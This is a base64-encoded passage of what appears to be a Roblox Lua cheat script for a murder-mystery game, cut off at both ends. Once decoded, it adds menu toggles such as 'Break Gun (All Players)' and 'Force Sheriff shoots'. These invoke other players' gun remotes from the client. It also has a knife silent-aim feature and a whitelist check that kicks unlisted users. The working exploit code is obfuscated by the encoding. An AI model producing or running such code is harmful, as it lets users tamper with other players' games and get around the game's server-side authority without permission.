ZCBndW4gdGhlbgoJCQkJCQkJcGNhbGwoZnVuY3Rpb24oKQoJCQkJCQkJCWd1bjpJbnZva2VTZXJ2ZXIoMSwgVmVjdG9yMi56ZXJvLCAiQUgyIikKCQkJCQkJCWVuZCkKCQkJCQkJZW5kCgkJCQkJZW5kCgkJCQllbmQKCQkJZW5kCgkJZW5kKQoJZW5kCmVuZCkKCkxpYnJhcnkuYWRkVG9nZ2xlKHRhYjEyLCAiQnJlYWsgR3VuIChBbGwgUGxheWVycykiLCAiIiwgZ2V0Z2VudigpLmwsIGZ1bmN0aW9uKHkpCglpZiB5IGFuZCBub3QgaShMb2NhbFBsYXllci5Vc2VySWQpIHRoZW4KCQlnZXRnZW52KCkuayA9IGZhbHNlCgkJZ2V0Z2VudigpLmwgPSBmYWxzZQoJCWdldGdlbnYoKS5zYXZlZENvbmZpZy5CcmVha0d1bk11cmRlcmVyT25seSA9IGZhbHNlCgkJZ2V0Z2VudigpLnNhdmVkQ29uZmlnLkJyZWFrR3VuQWxsUGxheWVycyA9IGZhbHNlCgkJZ2V0Z2VudigpLnNhdmVDb25maWcoZ2V0Z2VudigpLnNhdmVkQ29uZmlnKQoJCWlmIGdldGdlbnYoKS5hbCB0aGVuIGdldGdlbnYoKS5hbDpEaXNjb25uZWN0KCkgZ2V0Z2VudigpLmFsID0gbmlsIGVuZAoJCWlmIGdldGdlbnYoKS5tIHRoZW4gZ2V0Z2VudigpLm06RGlzY29ubmVjdCgpIGdldGdlbnYoKS5tID0gbmlsIGVuZAoJCUxvY2FsUGxheWVyOktpY2soInRyeWluZyB0byBieXBhc3MiKQoJCXJldHVybgoJZW5kCgoJZ2V0Z2VudigpLmwgPSB5CglnZXRnZW52KCkuc2F2ZWRDb25maWcuQnJlYWtHdW5BbGxQbGF5ZXJzID0geQoJZ2V0Z2VudigpLnNhdmVDb25maWcoZ2V0Z2VudigpLnNhdmVkQ29uZmlnKQoJaWYgZ2V0Z2VudigpLm0gdGhlbiBnZXRnZW52KCkubTpEaXNjb25uZWN0KCkgZ2V0Z2VudigpLm0gPSBuaWwgZW5kCgoJaWYgeSB0aGVuCgkJbG9jYWwgdCA9IDAKCQlnZXRnZW52KCkubSA9IFJ1blNlcnZpY2UuSGVhcnRiZWF0OkNvbm5lY3QoZnVuY3Rpb24oZHQpCgkJCXQgKz0gZHQKCQkJaWYgdCA8IDAuMSB0aGVuIHJldHVybiBlbmQKCQkJdCA9IDAKCQkJcHJpbnQoIkhlYXJ0YmVhdCAoQWxsIFBsYXllcnMpIikKCgkJCWlmIG5vdCBnZXRnZW52KCkubCB0aGVuIGdldGdlbnYoKS5tOkRpc2Nvbm5lY3QoKSBnZXRnZW52KCkubSA9IG5pbCByZXR1cm4gZW5kCgkJCWZvciBfLCBwbCBpbiBwYWlycyhQbGF5ZXJzOkdldFBsYXllcnMoKSkgZG8KCQkJCWlmIHBsIH49IExvY2FsUGxheWVyIHRoZW4KCQkJCQlsb2NhbCBocnAgPSBwbC5DaGFyYWN0ZXIgYW5kIHBsLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWRSb290UGFydCIpCgkJCQkJbG9jYWwgZ3VuID0gYygiR3VuIiwgcGwpCgkJCQkJaWYgaHJwIGFuZCBndW4gdGhlbgoJCQkJCQlwY2FsbChmdW5jdGlvbigpCgkJCQkJCQlndW46SW52b2tlU2VydmVyKDEsIFZlY3RvcjIuemVybywgIkFIMiIpCgkJCQkJCWVuZCkKCQkJCQllbmQKCQkJCWVuZAoJCQllbmQKCQllbmQpCgllbmQKZW5kKQoKTGlicmFyeS5hZGRCdXR0b24odGFiMTIsICJicmVhayBndW4gKGJ1dHRvbikiLCAiIiwgZnVuY3Rpb24oKQpsb2NhbCBQID0gZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikKbG9jYWwgUiA9IGdhbWU6R2V0U2VydmljZSgiUnVuU2VydmljZSIpCmxvY2FsIEMgPSBnYW1lOkdldFNlcnZpY2UoIkNvcmVHdWkiKQpsb2NhbCBHID0gZ2FtZTpHZXRTZXJ2aWNlKCJTdGFydGVyR3VpIikKbG9jYWwgTCA9IFAuTG9jYWxQbGF5ZXIKCmlmIEM6RmluZEZpcnN0Q2hpbGQoIlRMRyIpIHRoZW4KICAgIEMuVExHOkRlc3Ryb3koKQplbmQKCmxvY2FsIF9hID0gZmFsc2UKbG9jYWwgX2MKCmxvY2FsIGZ1bmN0aW9uIGYodCxwKQogICAgaWYgbm90ICh0IGFuZCBwKSB0aGVuIHJldHVybiBlbmQKICAgIGZvciBfLCB4IGluIHBhaXJzKHtwLkNoYXJhY3RlciwgcDpGaW5kRmlyc3RDaGlsZE9mQ2xhc3MoIkJhY2twYWNrIil9KSBkbwogICAgICAgIGlmIHggdGhlbgogICAgICAgICAgICBsb2NhbCB0b29sID0geDpGaW5kRmlyc3RDaGlsZCh0KQogICAgICAgICAgICBpZiB0b29sIGFuZCB0b29sOklzQSgiVG9vbCIpIHRoZW4KICAgICAgICAgICAgICAgIGlmIHQgPT0gIkd1biIgdGhlbgogICAgICAgICAgICAgICAgICAgIGxvY2FsIGtzID0gdG9vbDpGaW5kRmlyc3RDaGlsZCgiS25pZmVTZXJ2ZXIiKQogICAgICAgICAgICAgICAgICAgIGxvY2FsIGtsID0gdG9vbDpGaW5kRmlyc3RDaGlsZCgiS25pZmVMb2NhbCIpCiAgICAgICAgICAgICAgICAgICAgaWYga3MgYW5kIGtsIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgcyA9IChwID09IEwgYW5kIGtsOkZpbmRGaXJzdENoaWxkKCJDcmVhdGVCZWFtIikgYW5kIGtsLkNyZWF0ZUJlYW0uUmVtb3RlRnVuY3Rpb24pCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBvciBrczpGaW5kRmlyc3RDaGlsZCgiU2hvb3RHdW4iKQogICAgICAgICAgICAgICAgICAgICAgICBpZiBzIHRoZW4gcmV0dXJuIHMgZW5kCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBlbHNlaWYgdCA9PSAiS25pZmUiIHRoZW4KICAgICAgICAgICAgICAgICAgICByZXR1cm4gdHJ1ZQogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAogICAgZW5kCmVuZAoKbG9jYWwgZnVuY3Rpb24gaGFzSygpCiAgICBmb3IgXywgcCBpbiBwYWlycyhQOkdldFBsYXllcnMoKSkgZG8KICAgICAgICBpZiBmKCJLbmlmZSIsIHApIHRoZW4KICAgICAgICAgICAgcmV0dXJuIHRydWUKICAgICAgICBlbmQKICAgIGVuZAogICAgcmV0dXJuIGZhbHNlCmVuZAoKbG9jYWwgZnVuY3Rpb24gZGlzKCkKICAgIGlmIG5vdCBoYXNLKCkgdGhlbgogICAgICAgIGlmIF9jIHRoZW4KICAgICAgICAgICAgX2M6RGlzY29ubmVjdCgpCiAgICAgICAgICAgIF9jID0gbmlsCiAgICAgICAgZW5kCiAgICAgICAgX2EgPSBmYWxzZQogICAgICAgIEc6U2V0Q29yZSgiU2VuZE5vdGlmaWNhdGlvbiIsIHsKICAgICAgICAgICAgVGl0bGUgPSAiQnJlYWsgR3VuIiwKICAgICAgICAgICAgVGV4dCA9ICJEZWFjdGl2YWRvIiwKICAgICAgICAgICAgRHVyYXRpb24gPSAzCiAgICAgICAgfSkKICAgIGVuZAplbmQKCmxvY2FsIHNnID0gSW5zdGFuY2UubmV3KCJTY3JlZW5HdWkiLCBDKQpzZy5OYW1lID0gIlRMRyIKc2cuUmVzZXRPblNwYXduID0gZmFsc2UKCmxvY2FsIGIgPSBJbnN0YW5jZS5uZXcoIlRleHRCdXR0b24iLCBzZykKYi5TaXplID0gVURpbTIubmV3KDAsIDUwLCAwLCA1MCkKYi5Qb3NpdGlvbiA9IFVEaW0yLm5ldygxLCAtMzQwLCAwLCAxMCkKYi5EcmFnZ2FibGUgPSB0cnVlCmIuQmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDAuNgpiLkJhY2tncm91bmRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigyMDAsIDIwMCwgMjAwKQpiLlRleHQgPSAiQnJlYWsgR3VuIgpiLlRleHRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigyNTUsIDI1NSwgMjU1KQpiLkZvbnQgPSBFbnVtLkZvbnQuU291cmNlU2Fuc0JvbGQKYi5UZXh0U2l6ZSA9IDE0CgpJbnN0YW5jZS5uZXcoIlVJQ29ybmVyIiwgYikuQ29ybmVyUmFkaXVzID0gVURpbS5uZXcoMCwgOCkKCmxvY2FsIGJmID0gSW5zdGFuY2UubmV3KCJGcmFtZSIsIGIpCmJmLlNpemUgPSBVRGltMi5uZXcoMSwgMCwgMSwgMCkKYmYuQmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDEKCmxvY2FsIGJzID0gSW5zdGFuY2UubmV3KCJVSVN0cm9rZSIsIGJmKQpicy5UaGlja25lc3MgPSAyCmJzLkNvbG9yID0gQ29sb3IzLmZyb21SR0IoMjU1LCAyNTUsIDI1NSkKCkluc3RhbmNlLm5ldygiVUlDb3JuZXIiLCBiZikuQ29ybmVyUmFkaXVzID0gVURpbS5uZXcoMCwgMTApCgpiLk1vdXNlQnV0dG9uMUNsaWNrOkNvbm5lY3QoZnVuY3Rpb24oKQogICAgaWYgX2EgdGhlbgogICAgICAgIEc6U2V0Q29yZSgiU2VuZE5vdGlmaWNhdGlvbiIsIHsKICAgICAgICAgICAgVGl0bGUgPSAiQnJlYWsgR3VuIiwKICAgICAgICAgICAgVGV4dCA9ICJJdCBpcyBhbHJlYWR5IGFjdGl2ZSIsCiAgICAgICAgICAgIER1cmF0aW9uID0gMwogICAgICAgIH0pCiAgICAgICAgcmV0dXJuCiAgICBlbmQKICAgIGlmIG5vdCBoYXNLKCkgdGhlbgogICAgICAgIEc6U2V0Q29yZSgiU2VuZE5vdGlmaWNhdGlvbiIsIHsKICAgICAgICAgICAgVGl0bGUgPSAiQnJlYWsgR3VuIiwKICAgICAgICAgICAgVGV4dCA9ICJJdCBoYXMgbm90IHN0YXJ0ZWQiLAogICAgICAgICAgICBEdXJhdGlvbiA9IDMKICAgICAgICB9KQogICAgICAgIHJldHVybgogICAgZW5kCiAgICBfYSA9IHRydWUKICAgIGIuQXV0b0J1dHRvbkNvbG9yID0gZmFsc2UKICAgIGIuQWN0aXZlID0gZmFsc2UKICAgIF9jID0gUi5IZWFydGJlYXQ6Q29ubmVjdChmdW5jdGlvbigpCiAgICAgICAgZm9yIF8sIHAgaW4gcGFpcnMoUDpHZXRQbGF5ZXJzKCkpIGRvCiAgICAgICAgICAgIGlmIHAgfj0gTCB0aGVuCiAgICAgICAgICAgICAgICBsb2NhbCByID0gcC5DaGFyYWN0ZXIgYW5kIHAuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJIdW1hbm9pZFJvb3RQYXJ0IikKICAgICAgICAgICAgICAgIGxvY2FsIGcgPSBmKCJHdW4iLCBwKQogICAgICAgICAgICAgICAgaWYgciBhbmQgZyB0aGVuCiAgICAgICAgICAgICAgICAgICAgcGNhbGwoZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgICAgICAgICBnOkludm9rZVNlcnZlcigxLCBWZWN0b3IyLnplcm8sICJBSDIiKQogICAgICAgICAgICAgICAgICAgIGVuZCkKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgICAgICBkaXMoKQogICAgZW5kKQogICAgRzpTZXRDb3JlKCJTZW5kTm90aWZpY2F0aW9uIiwgewogICAgICAgIFRpdGxlID0gIkJyZWFrIEd1biIsCiAgICAgICAgVGV4dCA9ICJBY3RpdmF0ZWQiLAogICAgICAgIER1cmF0aW9uID0gMwogICAgfSkKZW5kKQplbmQpCgpsb2NhbCBwcyA9IGNyKGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpKQpsb2NhbCBscCA9IHBzLkxvY2FsUGxheWVyCmxvY2FsIHdzID0gY3IoZ2FtZTpHZXRTZXJ2aWNlKCJXb3Jrc3BhY2UiKSkKbG9jYWwgcnMgPSBjcihnYW1lOkdldFNlcnZpY2UoIlJlcGxpY2F0ZWRTdG9yYWdlIikpCmxvY2FsIGNzID0gY3IoZ2FtZTpHZXRTZXJ2aWNlKCJDb2xsZWN0aW9uU2VydmljZSIpKQpsb2NhbCBydW4gPSBjcihnYW1lOkdldFNlcnZpY2UoIlJ1blNlcnZpY2UiKSkKCmZ1bmN0aW9uIGZ3KG4sIHAsIGcpCglsb2NhbCByID0gbmlsCglwY2FsbChmdW5jdGlvbigpCgkJaWYgbm90IChuIGFuZCBwKSB0aGVuIHJldHVybiBlbmQKCQlsb2NhbCBmdW5jdGlvbiBjdyh3LCBsKQoJCQlpZiBub3QgKHcgYW5kIHc6SXNBKCJUb29sIikpIHRoZW4gcmV0dXJuIGVuZAoJCQlpZiB3Lk5hbWUgPT0gIkd1biIgdGhlbgoJCQkJbG9jYWwgaCwgaWcsIGtzLCBrbCA9IHc6RmluZEZpcnN0Q2hpbGQoIkhhbmRsZSIpLCB3OkZpbmRGaXJzdENoaWxkKCJJc0d1biIpLCB3OkZpbmRGaXJzdENoaWxkKCJLbmlmZVNlcnZlciIpLCB3OkZpbmRGaXJzdENoaWxkKCJLbmlmZUxvY2FsIikKCQkJCWlmIG5vdCAoaCBhbmQgaWcgYW5kIGtzIGFuZCBrbCkgdGhlbiByZXR1cm4gZW5kCgkJCQlsb2NhbCBzZyA9IGwgYW5kIGtsOkZpbmRGaXJzdENoaWxkKCJDcmVhdGVCZWFtIikgYW5kIGtsLkNyZWF0ZUJlYW0uUmVtb3RlRnVuY3Rpb24gb3Iga3M6RmluZEZpcnN0Q2hpbGQoIlNob290R3VuIikKCQkJCXJldHVybiBzZyBhbmQgKGcgYW5kIHtrcyA9IGtzLCBrbCA9IGtsLCBzZyA9IHNnLCBoID0gaH0gb3IgdHJ1ZSkKCQkJZWxzZWlmIHcuTmFtZSA9PSAiS25pZmUiIHRoZW4KCQkJCWxvY2FsIGgsIGtzID0gdzpGaW5kRmlyc3RDaGlsZCgiSGFuZGxlIiksIHc6RmluZEZpcnN0Q2hpbGQoIktuaWZlU2VydmVyIikKCQkJCWxvY2FsIHN0LCB0aCA9IGtzIGFuZCBrczpGaW5kRmlyc3RDaGlsZCgiU3RhYiIpLCBrcyBhbmQga3M6RmluZEZpcnN0Q2hpbGQoIlRocm93IikKCQkJCXJldHVybiBnIGFuZCB7a3MgPSBrcywgc3QgPSBzdCwgdGggPSB0aCwgaCA9IGh9IG9yIHRydWUKCQkJZW5kCgkJZW5kCgkJbG9jYWwgcHogPSB7cC5DaGFyYWN0ZXIsIHA6RmluZEZpcnN0Q2hpbGRPZkNsYXNzKCJCYWNrcGFjayIpfQoJCWZvciBfLCB6IGluIHBhaXJzKHB6KSBkbwoJCQlpZiB6IHRoZW4KCQkJCWxvY2FsIHcgPSB6OkZpbmRGaXJzdENoaWxkKG4pCgkJCQlsb2NhbCBmID0gdyBhbmQgY3codywgcCA9PSBscCkKCQkJCWlmIGYgdGhlbiByID0gZiBlbmQKCQkJZW5kCgkJZW5kCgllbmQpCglyZXR1cm4gcgplbmQKCmZ1bmN0aW9uIHNnKHAsIGEpCglpZiBub3QgKHAgYW5kIGEpIHRoZW4gcmV0dXJuIGVuZAoJbG9jYWwgZyA9IGZ3KCJHdW4iLCBwLCB0cnVlKQoJbG9jYWwgcyA9IGcgYW5kIChhWzJdID09IFZlY3RvcjIuemVybyBvciBnLmguUGFyZW50LlBhcmVudDpJc0EoIk1vZGVsIikpIGFuZCBnLnNnCglpZiBub3QgcyB0aGVuIHJldHVybiBlbmQKCXRhc2suc3Bhd24oZnVuY3Rpb24oKSBwY2FsbChmdW5jdGlvbigpIHM6SW52b2tlU2VydmVyKHVucGFjayhhKSkgZW5kKSBlbmQpCmVuZAoKTGlicmFyeS5hZGRCdXR0b24odGFiMTIsICJGb3JjZSBTaGVyaWZmIHNob290cyIsICIiLCBmdW5jdGlvbigpCglmb3IgXywgcCBpbiBwYWlycyhwczpHZXRQbGF5ZXJzKCkpIGRvCgkJaWYgcCB+PSBscCBhbmQgZncoIkd1biIsIHAsIGZhbHNlKSB0aGVuCgkJCWxvY2FsIHYgPSBtYXRoLnJhbmRvbSgwLCAxMCkKCQkJc2cocCwge1sxXSA9IDEsIFsyXSA9IFZlY3RvcjMubmV3KHYsIHYsIHYpLCBbM10gPSAiQUgyIn0pCgkJZW5kCgllbmQKZW5kKQoKbG9jYWwgdG9nZ2xlID0gZmFsc2UKbG9jYWwgaGJjb24gPSBuaWwKCmxvY2FsIGZ1bmN0aW9uIHN0b3BIZWFydGJlYXQoKQoJaWYgaGJjb24gdGhlbgoJCWhiY29uOkRpc2Nvbm5lY3QoKQoJCWhiY29uID0gbmlsCgllbmQKZW5kCgpsb2NhbCBmdW5jdGlvbiBzdGFydEhlYXJ0YmVhdCgpCglpZiBoYmNvbiB0aGVuIHJldHVybiBlbmQKCWxvY2FsIHQgPSAwCgloYmNvbiA9IHJ1bi5IZWFydGJlYXQ6Q29ubmVjdChmdW5jdGlvbihkdCkKCQl0ICs9IGR0CgkJaWYgdCA8IDAuMDUgdGhlbiByZXR1cm4gZW5kCgkJdCA9IDAKCQlsb2NhbCBhbnlHdW4gPSBmYWxzZQoJCWZvciBfLCBwIGluIHBhaXJzKHBzOkdldFBsYXllcnMoKSkgZG8KCQkJaWYgcCB+PSBscCBhbmQgZncoIkd1biIsIHAsIGZhbHNlKSB0aGVuCgkJCQlhbnlHdW4gPSB0cnVlCgkJCQlsb2NhbCB2ID0gbWF0aC5yYW5kb20oMCwxMCkKCQkJCXNnKHAsIHtbMV0gPSAxLCBbMl0gPSBWZWN0b3IzLm5ldyh2LHYsdiksIFszXSA9ICJBSDIifSkKCQkJZW5kCgkJZW5kCgkJaWYgbm90IGFueUd1biB0aGVuIHN0b3BIZWFydGJlYXQoKSBlbmQKCWVuZCkKZW5kCgpsb2NhbCBmdW5jdGlvbiBtb25pdG9yUGxheWVyKHApCglsb2NhbCBmdW5jdGlvbiBjaGVja1Rvb2xzKGNvbnRhaW5lcikKCQlsb2NhbCBmdW5jdGlvbiBvbkNoaWxkKGMpCgkJCWlmIGMuTmFtZSA9PSAiR3VuIiBhbmQgdG9nZ2xlIHRoZW4gc3RhcnRIZWFydGJlYXQoKSBlbmQKCQllbmQKCQlmb3IgXywgYyBpbiBwYWlycyhjb250YWluZXI6R2V0Q2hpbGRyZW4oKSkgZG8gb25DaGlsZChjKSBlbmQKCQljb250YWluZXIuQ2hpbGRBZGRlZDpDb25uZWN0KG9uQ2hpbGQpCgkJY29udGFpbmVyLkNoaWxkUmVtb3ZlZDpDb25uZWN0KGZ1bmN0aW9uKCkKCQkJdGFzay5kZWxheSguMDUsIGZ1bmN0aW9uKCkKCQkJCWlmIHRvZ2dsZSB0aGVuCgkJCQkJbG9jYWwgaGFzR3VuID0gZncoIkd1biIsIHAsIGZhbHNlKQoJCQkJCWlmIG5vdCBoYXNHdW4gdGhlbiBzdG9wSGVhcnRiZWF0KCkgZW5kCgkJCQllbmQKCQkJZW5kKQoJCWVuZCkKCWVuZAoKCXAuQ2hhcmFjdGVyQWRkZWQ6Q29ubmVjdChmdW5jdGlvbihjaGFyKQoJCWNoZWNrVG9vbHMoY2hhcikKCWVuZCkKCWlmIHAuQ2hhcmFjdGVyIHRoZW4gY2hlY2tUb29scyhwLkNoYXJhY3RlcikgZW5kCglsb2NhbCBicCA9IHA6RmluZEZpcnN0Q2hpbGRPZkNsYXNzKCJCYWNrcGFjayIpCglpZiBicCB0aGVuIGNoZWNrVG9vbHMoYnApIGVuZAplbmQKCkxpYnJhcnkuYWRkVG9nZ2xlKHRhYjEyLCAiQXV0byBmb3JjZSBzaGVyaWZmL2hlcm8gc2hvb3RzIiwgIiIsIGZhbHNlLCBmdW5jdGlvbihzKQoJdG9nZ2xlID0gcwoJaWYgbm90IHRvZ2dsZSB0aGVuIHN0b3BIZWFydGJlYXQoKSByZXR1cm4gZW5kCglmb3IgXywgcCBpbiBwYWlycyhwczpHZXRQbGF5ZXJzKCkpIGRvCgkJaWYgcCB+PSBscCB0aGVuIG1vbml0b3JQbGF5ZXIocCkgZW5kCgllbmQJCglwcy5QbGF5ZXJBZGRlZDpDb25uZWN0KGZ1bmN0aW9uKHApCgkJaWYgcCB+PSBscCB0aGVuIG1vbml0b3JQbGF5ZXIocCkgZW5kCgllbmQpCmVuZCkKCmxvY2FsIGkgPSB7CglOb3JtYWwgPSAicmJ4YXNzZXQ6Ly90ZXh0dXJlcy9Nb3VzZUxvY2tlZEN1cnNvci5wbmciLAoJU3Bhd24gPSAicmJ4YXNzZXRpZDovLzEzMzMwNDY2MTcwMjUxMCIsCglIZWFydCA9ICJyYnhhc3NldGlkOi8vMTA3ODAwNTc3NDM5NDg4IiwKCUthdCA9ICJyYnhhc3NldGlkOi8vMTI4NzA5MzAwNjIzMDUxIgp9Cgpsb2NhbCBhLCBiLCBjLCBkLCB4LCByb3RhdGVFbmFibGVkLCBjcm9zc1NpemUgPSBpLk5vcm1hbCwgZmFsc2UsIDEsIG5pbCwgbmlsLCBmYWxzZSwgMQpsb2NhbCBmdW5jdGlvbiBlKCkKCWlmIHggdGhlbiAKCQl4LkltYWdlID0gYQoJCXguU2l6ZSA9IFVEaW0yLm5ldygwLCAyNSAqIGNyb3NzU2l6ZSwgMCwgMjUgKiBjcm9zc1NpemUpCgllbmQKZW5kCgpsb2NhbCBmdW5jdGlvbiBnKCkKCWlmIGQgdGhlbiBkOkRpc2Nvbm5lY3QoKSBlbmQKCWlmIG5vdCB4IG9yIG5vdCByb3RhdGVFbmFibGVkIHRoZW4gcmV0dXJuIGVuZAoJZCA9IGdhbWU6R2V0U2VydmljZSgiUnVuU2VydmljZSIpLkhlYXJ0YmVhdDpDb25uZWN0KGZ1bmN0aW9uKCkKCQlpZiByb3RhdGVFbmFibGVkIHRoZW4KCQkJeC5Sb3RhdGlvbiA9ICh4LlJvdGF0aW9uICsgYykgJSAzNjAKCQllbmQKCWVuZCkKZW5kCgpsb2NhbCBmdW5jdGlvbiBmaW5kKCkKCWlmIG5vdCB4IHRoZW4KCQlmb3IgXywgdiBpbiBpcGFpcnMoZ2FtZTpHZXREZXNjZW5kYW50cygpKSBkbwoJCQlpZiB2OklzQSgiSW1hZ2VMYWJlbCIpIGFuZCB2Lk5hbWUgPT0gIkNyb3NzaGFpciIgdGhlbgoJCQkJeCA9IHYKCQkJCWJyZWFrCgkJCWVuZAoJCWVuZAoJZW5kCmVuZAoKTGlicmFyeS5hZGRUb2dnbGUodGFiMTIsICJDdXN0b20gQ3Vyc29yIiwgIiIsIGZhbHNlLCBmdW5jdGlvbihqKQoJYiA9IGoKCWlmIGogdGhlbgoJCWZpbmQoKQoJCWlmIHggdGhlbgoJCQllKCkKCQkJZygpCgkJZW5kCgllbHNlCgkJaWYgZCB0aGVuIGQ6RGlzY29ubmVjdCgpIGVuZAoJZW5kCmVuZCkKCkxpYnJhcnkuYWRkU2xpZGVyKHRhYjEyLCAiU3BlZWQgQ3Vyc29yIFJvdGF0aW9uIiwgIiIsIDEsIDEwLCAxLCBmdW5jdGlvbihrKQoJYyA9IGsKZW5kKQoKTGlicmFyeS5hZGRTbGlkZXIodGFiMTIsICJDcm9zc2hhaXIgU2l6ZSIsICIiLCAwLjUsIDMsIDAuNSwgZnVuY3Rpb24ocykKCWNyb3NzU2l6ZSA9IHMKCWlmIHggdGhlbgoJCXguU2l6ZSA9IFVEaW0yLm5ldygwLCAyNSAqIGNyb3NzU2l6ZSwgMCwgMjUgKiBjcm9zc1NpemUpCgllbmQKZW5kKQoKTGlicmFyeS5hZGRUb2dnbGUodGFiMTIsICJSb3RhdGUgQ3Vyc29yIiwgIiIsIGZhbHNlLCBmdW5jdGlvbih0KQoJcm90YXRlRW5hYmxlZCA9IHQKCWlmIHQgdGhlbgoJCWcoKQoJZWxzZQoJCWlmIGQgdGhlbiBkOkRpc2Nvbm5lY3QoKSBlbmQKCWVuZAplbmQpCgpMaWJyYXJ5LmFkZERyb3Bkb3duKHRhYjEyLCAiU2VsZWN0IFRoZSBDdXJzb3IiLCAiTm9ybWFsIiwgeyJOb3JtYWwiLCAiU3Bhd24iLCAiSGVhcnQiLCAiS2F0In0sIGZ1bmN0aW9uKGwpCglhID0gaVtsXSBvciBhCglpZiBiIHRoZW4gZSgpIGVuZAplbmQpCgpMaWJyYXJ5LmFkZFNlY3Rpb24odGFiMSwgIktuaWZlIFNpbGVudCBhaW0iKQoKZ2V0Z2VudigpLktuaWZlU2lsZW50QWltID0ge0N1cnJlbnRQcmVkaWN0aW9uID0gVmVjdG9yMy56ZXJvfQpnZXRnZW52KCkuS25pZmVBaW1FbmFibGVkID0gZ2V0Z2VudigpLnNhdmVkQ29uZmlnLktuaWZlQWltRW5hYmxlZCBvciBmYWxzZQpnZXRnZW52KCkuS25pZmVUYXJnZXRpbmdNb2RlID0gZ2V0Z2VudigpLnNhdmVkQ29uZmlnLktuaWZlVGFyZ2V0aW5nTW9kZSBvciAiTm9ybWFsIgpnZXRnZW52KCkuS25pZmVVc2VGT1YgPSBnZXRnZW52KCkuc2F2ZWRDb25maWcuS25pZmVVc2VGT1Ygb3IgZmFsc2UKZ2V0Z2VudigpLktuaWZlU2hvd1ByZWRpY3Rpb24gPSBnZXRnZW52KCkuc2F2ZWRDb25maWcuS25pZmVTaG93UHJlZGljdGlvbiBvciBmYWxzZQpnZXRnZW52KCkuS25pZmVTaG93Rk9WID0gZ2V0Z2VudigpLnNhdmVkQ29uZmlnLktuaWZlU2hvd0ZPViBvciBmYWxzZQpnZXRnZW52KCkuS25pZmVGT1ZTaXplID0gZ2V0Z2VudigpLnNhdmVkQ29uZmlnLktuaWZlRk9WU2l6ZSBvciA5MApnZXRnZW52KCkuS25pZmVGT1ZDb2xvciA9IGdldGdlbnYoKS5zYXZlZENvbmZpZy5LbmlmZUZPVkNvbG9yIGFuZCBDb2xvcjMubmV3KHVucGFjayhnZXRnZW52KCkuc2F2ZWRDb25maWcuS25pZmVGT1ZDb2xvcikpIG9yIENvbG9yMy5mcm9tUkdCKDI1NSwgMCwgMCkKCmxvY2FsIHByZWRpY3Rpb25JbnRlcnZhbEhvcml6b250YWwgPSBnZXRnZW52KCkuc2F2ZWRDb25maWcucHJlZGljdGlvbkludGVydmFsSG9yaXpvbnRhbCBvciAxNgoKbG9jYWwgQ2lyY2xlID0gRHJhd2luZy5uZXcoIkNpcmNsZSIpCkNpcmNsZS5Db2xvciA9IGdldGdlbnYoKS5LbmlmZUZPVkNvbG9yCkNpcmNsZS5SYWRpdXMgPSBnZXRnZW52KCkuS25pZmVGT1ZTaXplCkNpcmNsZS5UaGlja25lc3MgPSAxCkNpcmNsZS5GaWxsZWQgPSBmYWxzZQpDaXJjbGUuVmlzaWJsZSA9IGdldGdlbnYoKS5LbmlmZVNob3dGT1YgYW5kIGdldGdlbnYoKS5LbmlmZUFpbUVuYWJsZWQKCmxvY2FsIFByZWRpY3Rpb25JbmRpY2F0b3IgPSBEcmF3aW5nLm5ldygiQ2lyY2xlIikKUHJlZGljdGlvbkluZGljYXRvci5Db2xvciA9IENvbG9yMy5uZXcoMCwgMSwgMCkKUHJlZGljdGlvbkluZGljYXRvci5SYWRpdXMgPSA0ClByZWRpY3Rpb25JbmRpY2F0b3IuVGhpY2tuZXNzID0gMQpQcmVkaWN0aW9uSW5kaWNhdG9yLkZpbGxlZCA9IGZhbHNlClByZWRpY3Rpb25JbmRpY2F0b3IuVmlzaWJsZSA9IGdldGdlbnYoKS5LbmlmZVNob3dQcmVkaWN0aW9uIGFuZCBnZXRnZW52KCkuS25pZmVBaW1FbmFibGVkCgpsb2NhbCBmdW5jdGlvbiBVcGRhdGVDaXJjbGVQb3NpdGlvbigpCiAgICBDaXJjbGUuUG9zaXRpb24gPSBWZWN0b3IyLm5ldyhDYW1lcmEuVmlld3BvcnRTaXplLlggLyAyLCBDYW1lcmEuVmlld3BvcnRTaXplLlkgLyAyKQplbmQKVXBkYXRlQ2lyY2xlUG9zaXRpb24oKQpDYW1lcmE6R2V0UHJvcGVydHlDaGFuZ2VkU2lnbmFsKCJWaWV3cG9ydFNpemUiKTpDb25uZWN0KFVwZGF0ZUNpcmNsZVBvc2l0aW9uKQoKTGlicmFyeS5hZGRUb2dnbGUodGFiMSwgIktuaWZlIFNpbGVudCBBaW0iLCAiIiwgZ2V0Z2VudigpLktuaWZlQWltRW5hYmxlZCwgZnVuY3Rpb24oc3RhdGUpCiAgICBnZXRnZW52KCkuS25pZmVBaW1FbmFibGVkID0gc3RhdGUKICAgIGdldGdlbnYoKS5zYXZlZENvbmZpZy5LbmlmZUFpbUVuYWJsZWQgPSBzdGF0ZQogICAgZ2V0Z2VudigpLnNhdmVDb25maWcoZ2V0Z2VudigpLnNhdmVkQ29uZmlnKQoKICAgIENpcmNsZS5WaXNpYmxlID0gZ2V0Z2VudigpLktuaWZlU2hvd0ZPViBhbmQgc3RhdGUKICAgIFByZWRpY3Rpb25JbmRpY2F0b3IuVmlzaWJsZSA9IGdldGdlbnYoKS5LbmlmZVNob3dQcmVkaWN0aW9uIGFuZCBzdGF0ZQplbmQpCgpMaWJyYXJ5LmFkZERyb3Bkb3duKHRhYjEsICJLbmlmZSBBaW1pbmcgTW9kZSIsIGdldGdlbnYoKS5LbmlmZVRhcmdldGluZ01vZGUsIHsiTm9ybWFsIiwgIlByaW9yaXRpemUgdGhlIFNoZXJpZmYifSwgZnVuY3Rpb24oc2VsZWN0Z